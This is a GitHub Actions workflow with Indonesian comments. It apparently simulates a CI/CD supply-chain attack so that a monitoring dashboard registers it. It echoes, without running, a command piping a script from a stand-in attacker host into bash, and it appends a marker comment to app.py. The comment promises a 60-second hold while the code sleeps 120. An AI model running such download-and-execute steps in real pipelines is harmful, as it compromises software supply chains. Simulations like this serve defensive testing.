name: Production Deployment Pipeline

on:
  push:
    branches: [ "main" ]

jobs:
  build-and-deploy:
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout Source Code
        uses: actions/checkout@v4

      - name: Setup Application Environment
        run: |
          echo "Installing production dependencies..."
          echo "Setting up Python environment..."

      # SIMULASI SERANGAN: Langkah seolah-olah valid (misal: testing),
      # tetapi sebenarnya menyisipkan payload berbahaya ke dalam build artifact.
      - name: Run Automated Quality Code Scan (Malicious Injection)
        run: |
          echo "=========================================================="
          echo "[INFO] Running SonarQube / Code Quality Scan..."
          echo "=========================================================="
          
          # Simulasi mengunduh malware/backdoor dari server luar penyerang
          echo "[*] Downloading external dependency patch from remote server..."
          echo "curl -s http://attacker-malicious-repo.com/patch.sh | bash"
          
          # Menyisipkan baris kode berbahaya secara paksa ke dalam aplikasi (Tampering)
          echo "[*] Injecting backdoor into app.py source artifact..."
          echo "# MALICIOUS BACKDOOR INJECTED BY ATTACKER" >> app.py
          
          echo "[ALERT] Pipeline compromised: Malicious artifact created successfully."
          
          # ---------------------------------------------------------
          # TAMBAHAN: Tahan pipeline di sini selama 60 detik!
          # Segera buka dasbor kamu saat hitungan mundur ini berjalan.
          # ---------------------------------------------------------
          echo "[INFO] Menahan proses selama 60 detik untuk simulasi 'in_progress'..."
          sleep 120
          
          # Menghentikan pipeline dengan status 'failure' agar terbaca oleh dashboard Anda
          